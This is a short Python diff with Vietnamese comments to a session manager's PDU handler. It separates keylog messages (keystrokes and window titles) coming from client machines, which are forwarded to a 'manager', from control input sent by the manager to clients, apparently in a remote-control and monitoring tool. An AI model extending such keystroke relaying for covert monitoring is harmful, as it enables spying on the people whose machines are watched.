@@ -140,10 +140,18 @@ class SessionManager(threading.Thread):
     def handle_pdu(self, client_id, pdu):       
         pdu_type = pdu.get("type")
         
-        # Xử lý INPUT PDU (keylog) - LUÔN xử lý, không cần session
+        # Phân biệt keylog (từ client) vs điều khiển input (từ manager)
         if pdu_type == "input":
-            self._handle_input_pdu(client_id, pdu)
-            return
+            # Kiểm tra xem có phải keylog data không (có KeyData field)
+            input_data = pdu.get('input', {})
+            is_keylog = 'KeyData' in input_data or 'WindowTitle' in input_data
+            
+            # Nếu là keylog từ client → xử lý và forward tới manager
+            if is_keylog:
+                self._handle_input_pdu(client_id, pdu)
+                return
+            # Nếu là input điều khiển từ manager → forward tới client qua session
+            # (để tiếp tục xử lý bên dưới)
         
         # Xử lý các loại PDU khác
         session = None
